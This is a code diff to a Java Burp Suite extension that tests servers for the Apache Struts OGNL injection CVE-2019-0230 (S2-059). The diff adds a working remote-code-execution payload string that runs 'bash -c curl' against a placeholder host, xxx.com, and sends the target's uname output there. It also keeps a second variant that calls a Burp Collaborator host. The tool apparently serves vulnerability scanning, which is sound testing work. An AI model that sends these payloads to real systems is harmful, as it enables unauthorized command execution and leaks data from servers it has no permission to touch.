@@ -7,18 +7,19 @@ import burp.util.HttpResult;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintWriter;
-import java.util.List;
 
 public class Struts {
 
     public static void CVE_2019_0230() {
+        String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://xxx.com/`uname`'}))}";
+
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
-        String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";
+        String payload = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";
 
         // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
         // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
-        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
+        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
         Thread thread = new Thread(httpRequestThread);
         thread.start();
         try {
@@ -37,9 +38,9 @@ public class Struts {
         }
         HttpResult httpResult = httpRequestThread.getResulemessageInfo();
         if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
-            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", "", "hack!"));
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", poc, "hack!"));
         }else {
-            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", "", "pass"));
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", poc, "pass"));
         }
     }
 
